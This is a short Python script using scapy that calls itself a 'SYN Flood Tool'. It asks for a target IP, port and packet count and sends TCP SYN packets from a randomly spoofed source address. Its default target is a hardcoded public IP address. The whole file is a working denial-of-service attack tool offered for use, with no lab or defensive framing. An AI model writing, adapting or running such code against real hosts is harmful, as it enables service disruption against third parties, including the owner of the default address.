import os
import sys
from random import *
from ipaddress import IPv4Address
from scapy.all import *

DEFAULT_IP = "45.77.143.9"
DEFAULT_PORT = 80
DEFAULT_PACKETS_AMOUT = 10

def randomIP():
	bits = getrandbits(32) # generates an integer with 32 random bits
	addr = IPv4Address(bits) # instances an IPv4Address object from those bits

	return str(addr)

def configureIP(ip):
	IP_Packet = IP()
	IP_Packet.src = randomIP()
	IP_Packet.dst = ip

	return IP_Packet

def configureTCPPacket(port):
	s_port = randint(1000, 9000)
	s_eq = randint(1000, 9000)
	w_indow = randint(1000, 9000)

	TCP_Packet = TCP()
	TCP_Packet.sport = s_port
	TCP_Packet.dport = port
	TCP_Packet.flags = "S"
	TCP_Packet.seq = s_eq
	TCP_Packet.window = w_indow

	return TCP_Packet

def SYN_Flood(IP_Packet, TCP_Packet, counter):
	print("Packets are sending ...")

	for x in range(0, counter):
		send(IP_Packet / TCP_Packet, verbose=False)

	sys.stdout.write("\nTotal packets sent: %i\n" % counter)


def info():
	print("#############################")
	print("#  github.com/artemgurzhii  #")
	print("#############################")
	print("# Welcome to SYN Flood Tool #")
	print("#############################")

def params():
	destIP = input("Target IP : ") or DEFAULT_IP
	destPort = input("Target Port : ") or DEFAULT_PORT
	counter = input("How many packets do you want to send : ") or DEFAULT_PACKETS_AMOUT

	return destIP, int(destPort), int(counter)


def main():
	info()

	destIP, destPort, counter = params()

	ip = configureIP(destIP)
	tcp = configureTCPPacket(destPort)

	SYN_Flood(ip, tcp, counter)

main()
